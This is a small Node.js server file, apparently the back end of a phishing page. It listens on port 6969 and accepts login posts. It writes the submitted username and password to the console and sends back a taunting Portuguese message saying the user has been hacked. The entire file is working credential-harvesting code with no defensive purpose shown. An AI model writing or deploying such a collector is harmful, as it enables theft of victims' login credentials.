const http = require('http');

const content_json = { 'Content-Type': 'application/json' };

const server = http.createServer((req, res) => {
  if (req.url == "/login" && req.method == "POST") {
    let body = '';
    req.on('data', (data) => body += data);
    req.on('end', () => {
      let b = JSON.parse(body);
      console.log(`Usuario: ${b['usuario']}`);
      console.log(`Senha: ${b['senha']}`);
    });

    res.writeHead(200, content_json);
    let json_response = {'status': 'ok', 'response': 'Voce foi hackeado seu otario...'};
    res.write(JSON.stringify(json_response));
    res.end();
  }
});

server.listen(6969, () => {
  console.log("Server listening at port 6969");
});
